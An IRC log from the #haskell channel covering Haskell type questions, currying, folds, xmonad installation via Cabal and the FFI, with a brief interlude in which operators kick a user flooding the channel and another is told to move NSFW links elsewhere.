18:12:04 <FMota> well, you had me on the penis... but then you said enlargement
18:12:24 <sioraiocht> lol
18:15:29 <sioraiocht> FMota: maybe your tape has a spam filter, then
18:15:41 <FMota> ;)
18:15:42 <sioraiocht> is ther ean IRC client written in haskell yet?
18:16:22 <ddarius> Yes, Hircules and I think one or two others.
18:16:32 <sioraiocht> booo
18:16:54 <sioraiocht> are they any good?
18:17:20 <ddarius> I never used any of them.
18:19:12 <dgriffi3> ddarius: any that are not gtk?
18:20:08 <ddarius> I'm only sure Hircules existed and it was gtk if I remember correctly.
18:21:35 <dgriffi3> yeah, currently I use irssi, but its lack of vi-keys keeps me looking for an alternative
18:29:19 * ddarius can probably beat out the Derek Elkins of derekelkins.com in Google rank if he made a blog.
18:29:47 * ddarius lost track of tense there.
18:30:06 * OceanSpray too
18:31:42 <FMota> @t concatMap
18:31:42 <lambdabot> Maybe you meant: tell temp thank you thanks thx time tiny-url todo todo-add todo-delete topic-cons topic-init topic-null topic-snoc topic-tail topic-tell type . ft v
18:31:54 <FMota> hmm
18:31:54 <shachaf> FMota: @ty or :t.
18:32:08 <FMota> :t concatMap
18:32:10 <lambdabot> forall a b. (a -> [b]) -> [a] -> [b]
18:32:13 <FMota> so
18:32:21 <FMota> concatMap is like a monad operation
18:32:30 <FMota> (I mean, it's like bind)
18:32:35 <shachaf> FMota: Yes.
18:32:45 <FMota> :)
18:32:51 <mauke> map == liftM, concat == join
18:33:02 <mauke> bind = liftM + join
18:33:02 <shachaf> Actually, joinFmap is always (flip (>>=)).
18:33:10 <shachaf> What mauke said.
18:33:12 <ddarius> :t (>>=) `asTypeOf` concatMap
18:33:14 <lambdabot>     Couldn't match expected type `[b1] -> a -> b'
18:33:14 <lambdabot>            against inferred type `[a]'
18:33:19 <ddarius> :t (>>=) `asTypeOf` flip concatMap
18:33:21 <lambdabot> forall a b. [a] -> (a -> [b]) -> [b]
18:33:35 <FMota> :)
18:34:35 <FMota> flippedness sucks, though. :/
18:35:18 <shachaf> FMota: Isn't it better that you have a name for both?
18:35:33 <shachaf> FMota: Depending on how you need to use them?
18:35:46 <ddarius> :t (=<<) `asTypeOf` concatMap
18:35:49 <lambdabot> forall a b. (a -> [b]) -> [a] -> [b]
18:36:05 <FMota> yes
18:36:10 <shachaf> Well, OK.
18:36:28 <chessguy> @type (asTypeOf)
18:36:30 <lambdabot> forall a. a -> a -> a
18:37:08 <mauke> @src asTypeOf
18:37:08 <lambdabot> asTypeOf = const
18:37:41 <chessguy> @type const (=<<) concatMap
18:37:42 <lambdabot> forall a (m :: * -> *) b. (Monad m) => (a -> m b) -> m a -> m b
18:38:06 <mauke> @type const (=<<) sqrt
18:38:08 <lambdabot> forall a (m :: * -> *) b. (Monad m) => (a -> m b) -> m a -> m b
18:38:44 <shachaf> @ty (const :: a -> a -> a) (=<<) concatMap
18:38:46 <lambdabot> forall a b. (a -> [b]) -> [a] -> [b]
18:39:12 <ddarius> :t const
18:39:14 <lambdabot> forall a b. a -> b -> a
18:39:30 <shachaf> Is _ allowed in type signatures?
18:39:38 <shachaf> @ty const :: a -> _ -> a
18:39:40 <lambdabot> parse error on input `_'
18:39:47 <shachaf> I guess it wouldn't be very useful, in most cases.
18:40:03 <FMota> hmm
18:40:06 <shachaf> Is there a specific reason, though?
18:40:08 <FMota> we can make a Limit monad!
18:40:10 <FMota> cool.
18:40:30 * FMota wonders if that's been implemented already.
18:40:33 <FMota> Probably has.
18:41:33 <chessguy> probably implemented and generalized :)
18:42:47 <ddarius> FMota: What do you mean by "Limit"?
18:43:00 <FMota> a monad that operates on the limit of a sequence
18:43:06 <FMota> (or function)
18:55:42 <chessguy> what would be the use of indices in a Map?
18:55:56 <chessguy> is it ever better than just using the keys?
18:59:34 <kpreid> Might be some use case where the keys are very large, i.e. costly to compare, structures
19:00:08 <chessguy> hmm. maybe
19:00:21 <ddarius> That would be pretty silly, though technically Strings can easily fall under that.
19:00:34 <chessguy> awfully rare to have complicated instances of Ord, i would think
19:16:37 * ari is amused by lisppaste's presence on the ban list
19:16:39 <tech_> airy
19:16:39 <tech_> airy
19:16:40 <tech_> airy
19:16:41 <tech_> airy
19:16:44 <tech_> airy
19:16:46 <tech_> airy
19:16:48 <tech_> airy
19:16:50 <tech_> airy
19:16:51 <tech_> airy
19:16:54 <tech_> airy
19:16:56 <tech_> airy
19:16:57 <joed> Idiot
19:16:58 <tech_> airy
19:17:00 <tech_> airy
19:17:02 <Tac-Tics2> arity
19:17:03 <tech_> airy
19:17:05 <tech_> airy
19:17:08 <tech_> airy
19:17:10 <tech_> airy
19:17:13 <tech_> airy
19:17:15 <tech_> airy
19:17:18 <tech_> airy
19:17:20 <tech_> airy
19:17:21 <[azoic]> any ops around ?
19:17:23 <tech_> airy
19:17:25 <tech_> airy
19:17:27 <tech_> airy
19:17:28 <Tac-Tics2> > cycle "arity"
19:17:29 <lambdabot>  "arityarityarityarityarityarityarityarityarityarityarityarityarityarityarity...
19:17:30 <tech_> airy
19:17:33 <tech_> airy
19:17:35 <tech_> airy
19:17:37 <tech_> airy
19:17:40 <tech_> airy
19:17:43 <tech_> airy
19:17:45 <tech_> airy
19:17:48 <tech_> airy
19:17:50 <tech_> airy
19:17:53 <tech_> airy
19:17:55 <tech_> airy
19:17:55 <earnest> hehe
19:17:58 <tech_> airy
19:18:00 <tech_> airy
19:18:03 <tech_> airy
19:18:03 <FMota> im dozing off
19:18:05 <tech_> airy
19:18:05 <FMota> time for bed
19:18:07 <mauke> @ops
19:18:08 <lambdabot> Maybe you meant: docs pl
19:18:08 <tech_> airy
19:18:10 <earnest> FMota!
19:18:10 <tech_> airy
19:18:13 <tech_> airy
19:18:15 <tech_> airy
19:18:18 <tech_> airy
19:18:19 <FMota> earnest!
19:18:20 <tech_> airy
19:18:23 <tech_> airy
19:18:25 <tech_> airy
19:18:25 <earnest> 'zup? :)
19:18:28 <tech_> airy
19:18:30 <tech_> airy
19:18:33 <tech_> airy
19:18:36 <tech_> airy
19:18:36 <earnest> *** ignore Unknown command
19:18:38 <tech_> airy
19:18:38 <FMota> aoubt to fall over with exchaustion
19:18:41 <tech_> airy
19:18:41 <FMota> you?
19:18:43 <FMota> *about
19:18:43 <tech_> airy
19:18:45 <tech_> airy
19:18:45 <earnest> sort of the same
19:18:48 <tech_> airy
19:18:50 <earnest> but will be here for a bit still
19:18:50 <tech_> airy
19:18:53 <tech_> airy
19:18:55 <tech_> airy
19:18:58 <tech_> airy
19:19:00 <tech_> airy
19:19:01 <FMota> it's obv reddits fault
19:19:03 <tech_> airy
19:19:05 <tech_> airy
19:19:08 <tech_> airy
19:19:10 <tech_> airy
19:19:13 <tech_> airy
19:19:13 <earnest> who's reddits? :)
19:19:15 <tech_> airy
19:19:18 <tech_> airy
19:19:19 <chessguy> cale
19:19:20 <tech_> airy
19:19:21 --- mode: ChanServ set +o sjanssen
19:19:23 <tech_> airy
19:19:25 <tech_> airy
19:19:26 --- kick: tech_ was kicked by sjanssen (User terminated!)
19:19:27 <earnest> cale == reddits?
19:19:28 --- mode: ChanServ set +o Cale
19:19:29 <[azoic]> ty sjanssen
19:19:35 <[azoic]> and cale
19:19:44 <Nafai> earnest: programming.reddit.com
19:19:59 * chessguy couldn't remember who the ops are
19:20:04 <tech_> sorry airy
19:20:09 <tech_> i accidently typed airy too many times
19:20:13 <mauke> uh huh
19:20:18 <ari> ... so as I was about to say until my Norwegian friend who thinks I should change my nick to "airy" entered... I'm amused by lisppaste's presence on the ban list
19:20:18 <FMota> omg  http://reddit.com/info/2mg72/comments/c2mlwh
19:20:19 <lambdabot> Title: Vote up if you love pie! (reddit.com)
19:20:30 <tech_> ari: airy
19:20:32 <mauke> lambdabot needs a @get-ops command
19:20:47 <tech_> airy loves me
19:20:48 <tech_> he really does
19:21:15 <chessguy> @where+ ops cale glguy dons sjanssen
19:21:16 <lambdabot> Done.
19:21:18 <chessguy> @where ops
19:21:18 <lambdabot> cale glguy dons sjanssen
19:21:28 <Cale> chessguy: what?
19:21:38 <tech_> @where+ ari airy
19:21:38 <lambdabot> Done.
19:21:41 <tech_> @where ari
19:21:42 <lambdabot> airy
19:22:07 <sioraiocht> > map head $ iterate (\ (p:xs) -> [ x | x <- xs, x `mod` p /= 0]) [2..]
19:22:09 <lambdabot>  [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,...
19:22:09 <chessguy> Cale, was just demonstrating a get-ops-like capability
19:22:13 <Cale> ah
19:22:14 <sioraiocht> that's so weird..
19:22:48 <shapr> tech_: Dude, do something on-topic...
19:22:50 <mauke> looks like a prime sieve
19:23:05 <tech_> shapr: airy is on-topic
19:23:08 <shapr> tech_: Are you learning Haskell?
19:23:11 <shapr> tech_: Or are you leaving?
19:23:28 <shapr> I freely admit I had a bad week, and will take it out on any spammers.
19:23:29 <tech_> shapr: airy is learning me haskell
19:23:35 <tech_> @where ari
19:23:35 * ddarius isn't learning Haskell, do I have to go?
19:23:36 <sioraiocht> mauke: it is, it's just weird, it generates a list of lists, and the head of each list is a prime number..
19:23:39 <shapr> tech_: What have you learned so far?
19:23:50 <shapr> ddarius: You do stuff on-topic lots.
19:23:51 <sjanssen> @where+ ops shapr cale glguy dons sjanssen
19:23:51 <lambdabot> Done.
19:24:00 <tech_> shapr: i learned to add airy to haskell
19:24:02 <mauke> sioraiocht: yes, the lists are the intermediate states of filtering
19:24:03 <tech_> @where+ ari airy
19:24:03 <lambdabot> Done.
19:24:07 * ddarius stops being unproductive.
19:24:12 <araujo> can we kick him?
19:24:17 <ddarius> Go for it.
19:24:19 <shapr> tech_: Dude, you're getting on my one last nerve...
19:24:25 --- mode: ChanServ set +o shapr
19:24:30 <araujo> i don't like #haskell going like this
19:24:43 <mauke> @where+ ari
19:24:43 <shapr> How kind.
19:24:43 <lambdabot> Done.
19:24:49 <airy> hello
19:24:52 <sioraiocht> > map (take 5) $ iterate (\ (p:xs) -> [ x | x <- xs, x `mod` p /= 0]) [2..]
19:24:53 <airy> @where ari
19:24:54 <shapr> airy: Dude, I'm not kidding.
19:24:54 <lambdabot>  [[2,3,4,5,6],[3,5,7,9,11],[5,7,11,13,17],[7,11,13,17,19],[11,13,17,19,23],[1...
19:24:57 <[azoic]> please just ban him
19:25:09 <airy> what wrong have i done
19:25:26 --- kick: airy was kicked by shapr (Kicked by shapr)
19:25:36 --- mode: ChanServ set +b *!*@193.216.161.248
19:25:42 <shapr> poink
19:25:51 <mauke> airy: annoyed the ops
19:25:57 <ddarius> mauke: Too late.
19:26:07 * araujo throws a sugar lambda at shapr direction
19:26:10 <Nafai> That has to happen in #haskell even at times
19:26:14 <mauke> the cardinal rule of IRC is: you do not annoy the ops
19:26:18 <shapr> It's not that he annoyed the ops, it's that he was just totally distracting, and completely off-topic.
19:26:29 <shapr> Would you like a line count on how many times he said airy?
19:26:58 <shapr> So, what're people learning lately?
19:27:03 <mauke> no, thanks (and stupid spam is a very fine way of annoying everyone in a channel, including ops)
19:27:13 <sjanssen> grep airy 07.09.07 | wc -l == 92
19:27:19 <shapr> sjanssen: Thank you :-)
19:27:24 <fnord126> what does --| as a comment line mean? Will that be parsed by haddock in a specific way?
19:27:29 <ddarius> shapr: I'm eyeing actually implementing LolliMon in Haskell.
19:27:42 * shapr googles LolliMon
19:27:51 <shapr> Oh, that's interesting.
19:28:04 <sjanssen> fnord126: you're missing a space after "--", but yes, special haddock markup
19:28:24 <Nafai> LolliMon?
19:28:29 <shapr> "Monadic concurrent linear logic programming"
19:28:30 <Nafai> Hey bos!
19:28:46 <ddarius> shapr: http://www.cs.cmu.edu/~fp/papers/ppdp05.pdf (or ps) and http://www.cs.cmu.edu/~fp/papers/types03.pdf
19:28:59 --- mode: ChanServ set -o sjanssen
19:29:06 <fnord126> sjanssen: thanks. I see it all over the xmonad code so I guess you'e the best person to have answered. :D
19:29:07 <shapr> "LolliMon is a new monadic concurrent linear logic programming language which grew out of the analysis of the operational semantics of term construction for the concurrent logical framework"
19:29:10 --- mode: shapr set -o shapr
19:29:27 * chessguy removes channel operator status from shapr too
19:29:33 <shapr> heh
19:30:05 <mrd> kw is the guy who gave the haskell/cosmological theorem talk
19:30:13 <sjanssen> fnord126: it attaches the documentation to the identifier below the comment
19:30:28 <chessguy> say wyat?
19:30:37 <chessguy> mrd, link?
19:30:47 <shapr> Conway's lost cosmological theorem?
19:30:51 <fnord126> here's a disturbing google result for lollimon: "haskell "lollimon - gotta rape'em all..." :-/ Cheery: yay!"
19:30:56 <mauke> .oO( <sjanssen> or it gets the hose again )
19:31:05 <shapr> ick
19:31:16 <mrd> yea
19:32:17 <shapr> ddarius: Got any code?
19:32:58 <shapr> Wow, lots of new vocabulary in this paper.
19:33:52 <ricky_clarkson> In something like a -> b -> c, I wonder if a different symbol would be clearer instead of the final ->.
19:33:57 <sjanssen> mauke: Silence of the Lambdas?
19:34:06 <ricky_clarkson> But then that probably just means I'm not understanding currying properly.
19:34:09 <ricky_clarkson> :t (.)
19:34:12 <lambdabot> forall b c a. (b -> c) -> (a -> b) -> a -> c
19:34:16 <mrd> ricky_clarkson: the latter
19:34:19 <mauke> sjanssen: haha
19:34:21 <shapr> ricky_clarkson: Think of it as every function takes one argument and returns a new function.
19:34:30 <shapr> sjanssen: haha!
19:34:45 <sjanssen> hmm, perhaps I should watch that tonight
19:34:46 <chessguy> shapr, err, or returns a value
19:34:58 <ricky_clarkson> shapr: If values are functions, yes.
19:35:07 <shapr> What if functions are values?
19:35:08 <chessguy> unless you're considering values to be functions of 0 arity
19:35:18 <shapr> Or what if it's all just your imagination?
19:35:21 <ricky_clarkson> What chessguy said.
19:35:24 <chessguy> lol
19:35:29 <ricky_clarkson> But not that.
19:36:03 <ddarius> shapr: I have a .hs file with a bunch of comments in it and 'module LolliMon where'
19:36:17 <sjanssen> ricky_clarkson: it doesn't make much sense to use a different symbol for the last ->, because they all mean the same thing
19:36:45 <shapr> ddarius: Sounstd like a good start!
19:37:14 <mauke> the important part is that -> groups to the right
19:37:16 <sjanssen> ricky_clarkson: "f :: a -> b -> c" means the same as "f :: a -> (b -> c)"
19:37:43 <sjanssen> ricky_clarkson: and each time you apply a value to a function, you take away the ->
19:37:46 <ricky_clarkson> Yes, though sometimes it seems unintuitive.
19:37:58 <mauke> a -> (b -> (c -> (d -> e))) -- tail nesting!
19:38:10 <sjanssen> so "f x" has type "b -> c", and "f x y :: c"
19:38:13 <mrd> It'll seem more intuitive when you understand it.
19:38:29 <ricky_clarkson> E.g., (.) would seem more intuitive as: (a -> b) -> (b -> c) -> (a -> c), but obviously the final parens are unnecessary.
19:38:39 <mauke> ricky_clarkson: do you understand  flip id ?
19:38:53 <ricky_clarkson> :t flip id
19:38:55 <lambdabot> forall b c. b -> (b -> c) -> c
19:39:03 <ddarius> shapr: The first thing is to write a parser which is a bit tricky as there isn't any (semi-)formal syntax description anywhere
19:39:21 <sjanssen> ricky_clarkson: yes, sometimes extra parens in type signatures can make things more clear -- just like extra parens in expressions
19:39:36 <ddarius> fmap :: (a -> b) -> (f a -> f b)
19:39:53 <ricky_clarkson> sjanssen: Would the unnecessary parens actually change what :t reports?
19:40:09 <mauke> liftM :: (a -> b) -> (m a -> m b) :-)
19:40:37 <sjanssen> ricky_clarkson: I'm not sure -- ghci tries to do some clever things to preserve the syntax of the original type signature
19:40:42 <sjanssen> @type (.)
19:40:43 <lambdabot> forall b c a. (b -> c) -> (a -> b) -> a -> c
19:40:47 <ricky_clarkson> :t \b f=f b
19:40:50 <lambdabot> parse error on input `='
19:40:57 <ricky_clarkson> :t \b f -> f b
19:41:00 <lambdabot> forall t t1. t -> (t -> t1) -> t1
19:41:08 <sjanssen> @type let foo :: (b -> c) -> (a -> b) -> (a -> c) in foo
19:41:10 <lambdabot> Not in scope: `foo'
19:41:10 <lambdabot>  
19:41:10 <lambdabot> <interactive>:1:47: Not in scope: `foo'
19:41:19 <sjanssen> @type let foo :: (b -> c) -> (a -> b) -> (a -> c); foo = undefined in foo
19:41:21 <lambdabot> (b -> c) -> (a -> b) -> (a -> c); foo = undefined in foo :: forall b c a. (b -> c) -> (a -> b) -> a -> c
19:41:33 <ricky_clarkson> Yes, I understand flip id, at least from its type.  My understanding of flip comes and goes though.
19:41:33 <mauke> that's a no
19:41:44 <sjanssen> ricky_clarkson: looks like ghc forgets those extra parens
19:41:47 <mauke> @src flip
19:41:48 <lambdabot> flip f x y = f y x
19:41:49 <chessguy> @type (>>=)
19:41:49 <mauke> @src id
19:41:51 <lambdabot> forall (m :: * -> *) a b. (Monad m) => m a -> (a -> m b) -> m b
19:41:51 <lambdabot> id x = x
19:42:00 <ricky_clarkson> :t flip
19:42:02 <lambdabot> forall a b c. (a -> b -> c) -> b -> a -> c
19:42:10 <ddarius> @. djinn type flip
19:42:13 <lambdabot> f a b c = a c b
19:42:28 <chessguy> @src flip
19:42:28 <lambdabot> flip f x y = f y x
19:42:44 <mauke> (a -> b -> c) -> (b -> a -> c)
19:43:13 <ricky_clarkson> mauke: Those help.
19:43:50 <chessguy> i think seeing and understanding lots of partially applied functions helps with understanding currying
19:44:57 <ricky_clarkson> I think I understand it, I just forget/don't know its implications.
19:45:07 <fnord126> erf, I can't dl the lollimon pdf.
19:45:34 <ricky_clarkson> When I do (2*) I'm quite pleased with partial application, but seeing the type of * as a -> a -> a is less intuitive.
19:46:33 <kpreid> (2*) is the same as (*) 2.
19:46:41 <ddarius> fnord126: Works for me.
19:50:41 <mudge> hey lambdabot is back
19:50:43 <sjanssen> ricky_clarkson: how much time have you spent with Haskell?
19:51:04 <mudge> lambdabot: hi
19:51:19 <Nafai> dons: So how was the first week?
19:51:21 <ricky_clarkson> sjanssen: I slept with it last night.
19:51:24 <dons> Nafai: fun!
19:51:30 <Nafai> dons: Yay!
19:52:01 <ricky_clarkson> sjanssen: Not a great deal, I'm more learning about it than using it.
19:52:30 <sjanssen> ricky_clarkson: I think you'll become more comfortable with this over time
19:53:01 <sjanssen> it is quite different from many other languages, but it is very logical once you "get it"
19:53:37 <earnest> remember we were talking about how nice the haskell community is? there's a recent thread in some git mail list with their developers talking about the idea of using a better string library for their code; there's even some messages of linus torvalds there as to why he dislikes c++; notice how respectful they are with one another: the thread is there: http://thread.gmane.org/gmane.comp.version-control.git/57643/focus=57918
19:53:40 <lambdabot> Title: Gmane Loom, http://tinyurl.com/2lehwo
19:54:18 <earnest> sjanssen: you're the author of xmonad? is that you?
19:54:30 <sjanssen> earnest: yes, one of them
19:54:53 <SamB> has a large author/code ratio, eh?
19:55:09 <earnest> cool; i haven't used it yet for being lazy on deciding how to resolve the haskell dependencies i need to resolve, but i have been reading about it and watching the screenshots; very cool software
19:55:36 <earnest> that's really what i'd like in a window manager; simple and predictability; i was happy to recognize your name there from seeing it here :)
19:56:05 <earnest> i wish i could just aptitude install xmonad, but that's not possible yet :)
19:56:33 <mauke> pfft, what's the point of installing xmonad if you don't write your own Config.hs? :-)
19:56:34 <sjanssen> earnest: dependencies shouldn't be too bad -- your favorite Unix distro should have ghc, mtl and X11
19:56:54 <sjanssen> earnest: and you can get the rest at hackage.haskell.org
19:57:21 <earnest> the configure process tells me that it couldn't satisfy X11>=1.2.1
19:57:32 <SamB> you need a newer one then ;-)
19:57:33 <earnest> so do i need a better X?
19:57:38 <earnest> hehe, that really sucks :)
19:57:46 <sjanssen> SamB: mostly because the value of 'code' is very very small :)
19:57:52 <SamB> sjanssen: true ;-)
19:57:55 <sorear> earnest: 'X11' is overloaded
19:58:01 <mauke> X11 is the haskell library here
19:58:03 <sorear> earnest: it refers to a window system, yes
19:58:15 <sorear> earnest: but it also refers to several bindings to it
19:58:22 <earnest> oh, it's X11-haskell-library? that sounds so much better
19:58:30 <sorear> earnest: in this context, it's a (rather poorly made) haskell library
19:58:59 <mauke> http://www.haskell.org/ghc/docs/latest/html/libraries/X11/Graphics-X11-Xlib.html
19:59:01 <lambdabot> http://tinyurl.com/hcyq3
19:59:07 <SamB> you mean like "unix"?
19:59:13 <sorear> no, worse
19:59:20 <sjanssen> or 'time' :)
19:59:34 <SamB> oh, like they got the functionality all wrong as well as the names?
19:59:53 <sjanssen> the names are quite consistent, actually
20:00:01 <SamB> sjanssen: worse!
20:00:02 <sjanssen> SamB: missing functions is the major problem
20:00:26 <earnest> i just need to download the source code of the library?
20:00:31 <sorear> SamB: there are comments to the effect of '-- Nobody will use this, I'm sure.  Binding not bothered with.'
20:00:42 <earnest> and put it somewhere in special?
20:00:47 <SamB> sorear: uh huh
20:00:52 <sjanssen> earnest: grab it from:
20:00:54 <sjanssen> @hackage X11
20:00:55 <lambdabot> http://hackage.haskell.org/cgi-bin/hackage-scripts/package/X11
20:00:59 <SamB> earnest: you have to build, too ;-p
20:01:04 <sorear> earnest: uhm, 'put it somewhere special?'
20:01:05 <sjanssen> earnest: then you'll do what we call the "Cabal dance"
20:01:14 <earnest> hehe cabal dance? sounds fun
20:01:52 <sjanssen> "runhaskell Setup configure --prefix=$HOME; runhaskell Setup build; runhaskell Setup install --user"
20:02:05 * sjanssen has that aliased as "cbdance" :)
20:02:44 <mauke> wait, so you have all kinds of stuff in your $HOME?
20:03:02 <TSC> Thats "hc ; hb ; hi" here (:
20:03:40 <sorear> I have a cabal-build, which is like that but much much much better because it uses && rather than ;
20:03:43 <sorear> :D
20:03:55 <sjanssen> sorear: yeah, I use && too
20:04:49 <earnest> sjanssen: so the cabal dance is the equivalent to the gnu dance: configure-make-make-install?
20:05:07 <sjanssen> mauke: yes, I prefer non-OS packages in $HOME
20:05:10 <sjanssen> earnest: exactly
20:05:16 <earnest> gotcha
20:05:29 <mauke> sjanssen: sure, but I use $HOME/usr to keep it all in one place
20:05:29 <Tac-Tics2> is there a standard function that does this?
20:05:30 <Tac-Tics2> ap [] x = x
20:05:30 <Tac-Tics2> ap (f:fs) x = ap fs (f x)
20:05:33 <earnest> i like these dances
20:06:09 <earnest> i need to install my X11 libraries
20:06:11 <earnest> my system is brand new
20:06:21 <scook0> Tac-Tics2: it's probably some kind of fold using (.)
20:06:27 <Tac-Tics2> ah
20:06:39 <Tac-Tics2> it sounded like the kind of question to which the answer is a fold
20:06:41 <mauke> :t foldl (.) id
20:06:43 <lambdabot> forall a. [a -> a] -> a -> a
20:06:45 <Tac-Tics2> yeah
20:06:54 <Tac-Tics2> I was just about to say, the base value is "id"
20:06:57 <Tac-Tics2> thanks
20:07:18 <mauke> ap [] = id; ap (f:fs) = ap fs . f
20:08:03 <mauke> (makes the fold shape more obvious)
20:08:24 <Tac-Tics2> folds are just another way to say "accumulate" right?
20:08:29 <byorgey> hm, isn't foldl (.) id backwards?
20:08:34 <ddarius> left folds are
20:08:48 <Tac-Tics2> (in this case, my functions are commutative, so it doesn't matter the direction, I dunt think)
20:08:53 <byorgey> @where folds
20:08:53 <lambdabot> http://cale.yi.org/index.php/Fold_Diagrams
20:08:57 <andrei> Is there a nice way to speed up hxt? I have a 400k xml document I have to parse and it isn't going well..
20:09:01 <byorgey> Tac-Tics2: ah, ok
20:09:12 <andrei> The parser is rather simple, but it allocates so much in the way of strings that things go a bit insane
20:09:22 <byorgey> Tac-Tics2: check out those pretty pictures of folds ^^^  =)
20:09:41 <Tac-Tics2> yes, I saw those yesterday on Cale's site
20:09:46 <Tac-Tics2> they are neat
20:11:37 <byorgey> > let ap = foldl (flip (.)) id in ap [(+2),(*4)] $ 1
20:11:39 <lambdabot>  12
20:12:12 <Tac-Tics2> holy crap... it worked
20:12:13 <Tac-Tics2> hehe
20:12:33 <Tac-Tics2> my code is so obfuscated it is making me ill
20:12:36 <Tac-Tics2> but it worked
20:13:33 <byorgey> > let ap = appEndo . mconcat . map Endo in ap [(+2), (*4)] $ 1
20:13:34 <lambdabot>  6
20:15:32 <reffje> http://funnyimagedump.com/art/fullview/Holy-Shit.jpg
20:15:49 <sjanssen> byorgey++ monoids are always karma worthy
20:15:59 <byorgey> heh, thanks sjanssen =)
20:16:01 <poh> how do I convert a number to a string?
20:16:06 <mauke> poh: show
20:16:08 <sjanssen> > show 10
20:16:09 <poh> thanks
20:16:10 <lambdabot>  "10"
20:16:22 <earnest> oh, so instead of running ./configure at all, we just say runhaskell Setup.hs configure --prefix=/some/place? i actually ran ./configure first, but i guess it was harmless
20:17:11 <thoughtpolice> earnest: cabal will automatically run ./configure if it exists upon configuring the package
20:17:21 <earnest> yeah, i see
20:17:58 <earnest> how does a haskell interface to the xlib (or something else) work?
20:18:07 <earnest> how does one connect one language to another?
20:18:21 <mauke> reffje: http://cgi.4chan.org/r/src/1189218076792.gif (NSFW)
20:18:24 <sjanssen> earnest: through an foreign function interface (FFI)
20:18:25 <thoughtpolice> using the FFI.
20:18:28 <thoughtpolice> @where ffi
20:18:28 <lambdabot> http://www.cse.unsw.edu.au/~chak/haskell/ffi/
20:18:44 <sjanssen> @smack mauke
20:18:44 <lambdabot> Unknown command, try @list
20:18:46 <reffje> mauke lol
20:18:47 <sjanssen> @slap mauke
20:18:48 * lambdabot beats up mauke
20:18:50 <Tac-Tics2> mauke, please take it to blah
20:19:01 <mauke> ok
20:19:04 <Tac-Tics2> hehe
20:19:16 <sjanssen> mauke: what did you say rule #1 of IRC is . . . ;)
20:19:29 <sioraiocht> don't piss off shapr
20:19:52 <goalieca> hmm cale's fold diagrams on reddit now?
20:20:06 <thoughtpolice> they've been there before, iirc
20:20:13 <Cale> yeah, logan pasted them yesterday
20:20:24 <Cale> no, they've never been on reddit before, as far as I know
20:20:29 <Cale> posted*
20:20:49 <thoughtpolice> hm. thought I saw them some on reddit once. was pretty sure, anyway.
20:21:05 <ddarius> Allegedly Cale's mentioned them in comments before.
20:22:49 <andrei> Is there a nice way to speed up hxt? I have a 400k xml document I have to parse and it isn't going well.. the parser allocates a whole bunch of memory which makes anything take ages to do.
20:25:13 <earnest> except for fdset() and defaultErrorHandler(), i see no other c-code; it's funny how you can interface haskell with the xlib without much c-code. i'm puzzled. is FFI something that does a lot of the work for us?
20:26:07 <mauke> earnest: the FFI lets you import C functions into haskell
20:26:21 <mauke> so you can just call them without having to write wrappers in C first
20:26:28 * ddarius hugs the FFI.
20:26:37 <thoughtpolice> hugs are good
20:27:23 <earnest> mauke: i see, but i wish i could understand how that is accomplished in practice
20:27:40 <mauke> well, look at the compiler source :-)
20:27:52 <earnest> oh, is that something done by the ghc?
20:28:08 <mauke> yes, it needs compiler support
20:28:10 <earnest> FFI is just a grammar for compiler implementors?
20:28:25 <mauke> huh?
20:28:27 <Chris> w/s 34
20:28:28 <ddarius> @where ffi
20:28:29 <lambdabot> http://www.cse.unsw.edu.au/~chak/haskell/ffi/
20:28:51 <pgavin> ffi = foreign function interface
20:28:58 <pgavin> e.g., call C from Haskell
20:29:02 <pgavin> or vice-versa
20:29:20 <earnest> hehe, people don't understand other people's trouble :)
20:29:40 <earnest> i look at this homepage and i see a document
20:30:28 <earnest> it doesn't seem to tell how the whole thing actually works
20:30:39 <earnest> that is, how a higher level language can call functions in a lower level one
20:30:47 <earnest> but i haven't read everything
20:30:59 <pgavin> earnest: it's actually very straight forward
20:31:12 <mauke> earnest: it happens all the time
20:31:18 <mauke> guess what (+) is written in
20:31:21 <ddarius> earnest: Why do you think there would be difficulties?
20:31:43 <ddarius> (+) is written in Haskell, or the GHC dialect thereof.
20:31:51 <ddarius> (in GHC, obviously)
20:32:11 <mauke> even the Integer instance?
20:32:42 <pgavin> (+) is just as intrinsic as if or case
20:32:45 <Philippa> mauke: yep, the actual primitives have a # in the name
20:32:59 <mauke> well, ok
20:33:28 <andrei> So anyone know anything about getting HXT to work faster? (sorry to keep asking, it's just somewhat important as if it doesn't work I have to rewrite things in a different language soon)
20:33:46 <pgavin> hxt?
20:33:54 <Philippa> earnest: hint - it all ends up as machine code (or something interpreted by something in machine code) sooner or later
20:34:13 <andrei> pgavin, haskell xml toolbox
20:34:14 <earnest> ddarius: good question; i think that ghc would generate assembly code to be linked, skipping c; so if you want to write some haskell code that will ultimately call a function defined in c, then ... i don't know what's needed; i'm thinking
20:34:25 <ddarius> andrei: There incidentally was a post on HXT on haskell-cafe just now.
20:34:58 <ddarius> earnest: See what Philippa said.
20:35:23 <earnest> Philippa: right; so when i write, say, putStr "something", what does ghc do? does it actually write code to call printf() or does it write the lowest level code (say, write()) to do the work?
20:36:04 <andrei> ddarius, That's generating, not parsing
20:36:04 <sjanssen> earnest: it doesn't use printf... probably something closer to write()
20:36:05 <earnest> ``to call prinf()'' means an assembly call, i dont mean writing c-code to be compiled by a c-compiler; i suppose that's not what ghc currently does; it writes assembly, right?
20:36:11 <andrei> ddarius, And it's with a tiny amount of data
20:36:19 <ddarius> andrei: Ah, right about the generating.
20:36:24 <thoughtpolice> earnest: you can compile via C or not
20:36:24 <sjanssen> earnest: it can write both C and assembly
20:36:31 <ddarius> andrei: Most likely you have some "bug" in your code.  Use the profiler.
20:36:35 <thoughtpolice> using the -fvia-C flag
20:36:38 <earnest> sjanssen: ghc can currently c?
20:36:39 <andrei> ddarius, I did
20:36:46 <ddarius> andrei: And?
20:36:47 <earnest> hm, that's very cool
20:36:51 <earnest> i didn't know it could do that
20:36:54 <sjanssen> earnest: yes -- very ugly C
20:36:58 <Philippa> IIRC the RTS and the primops're written in C for portability
20:36:59 <andrei> ddarius, It spends 95% of its time at:  getXPathTrees "//table//span[@id = 'addresslink']/a/@href"
20:36:59 <earnest> hehe, i'm sure :)
20:37:12 <thoughtpolice> I believe the C backend is kind of on its way out though, isn't it?
20:37:23 <andrei> ddarius, Doing about the same percentage of allocations there
20:37:38 <andrei> ddarius, That function is only getting called once on the one document
20:38:00 <ddarius> andrei: getXPathTrees is from HXT?  (Try emailing the maintainer.)
20:38:08 <andrei> ddarius, Yup, it is
